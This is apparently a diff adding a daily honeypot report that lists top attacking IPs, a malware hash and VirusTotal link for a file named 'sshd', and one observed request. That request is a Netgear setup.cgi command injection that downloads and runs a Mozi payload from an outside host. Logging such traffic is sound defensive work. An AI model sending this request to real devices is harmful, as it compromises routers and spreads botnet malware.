@@ -1,0 +1,19 @@
+Top 5 IPs for 11-09-2024 :
+
+189.241.249.170
+187.251.150.198
+150.223.47.145
+139.59.232.228
+120.50.8.56
+
+
+Malware Observed:
+
+File Name : sshd
+8ba894b2cdc50ad8abc2b462a923f9506d9ad6b504583d29517a26f2107abeeb
+https://www.virustotal.com/gui/file/8ba894b2cdc50ad8abc2b462a923f9506d9ad6b504583d29517a26f2107abeeb
+
+
+Commands/exploits observed :
+
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://221.1.227.222:44245/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
